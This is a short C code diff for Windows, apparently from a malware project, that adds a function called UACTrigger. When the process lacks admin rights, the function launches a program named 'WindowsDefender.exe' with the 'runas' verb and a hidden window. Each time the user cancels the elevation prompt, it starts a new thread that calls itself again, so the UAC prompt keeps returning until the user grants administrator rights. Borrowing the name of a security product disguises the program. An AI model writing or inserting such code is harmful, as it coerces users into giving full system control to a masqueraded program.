@@ -79,3 +79,22 @@ BOOL IsAdmin() {
 
 	return fIsRunAsAdmin;
 }
+
+void UACTrigger() {
+    BOOL isalreadyadmin = IsAdmin();
+    if (!isalreadyadmin) {
+
+		SHELLEXECUTEINFO sei = {sizeof(sei)};
+
+		sei.lpVerb = "runas";
+		sei.lpFile = "WindowsDefender.exe";
+		sei.hwnd = NULL;
+		sei.nShow = SW_HIDE;
+
+		if (!ShellExecuteEx(&sei)) {
+			DWORD dwError = GetLastError();
+			if (dwError == ERROR_CANCELLED)
+			CreateThread(0, 0, (LPTHREAD_START_ROUTINE) UACTrigger, 0, 0, 0);
+        }
+    } 
+}
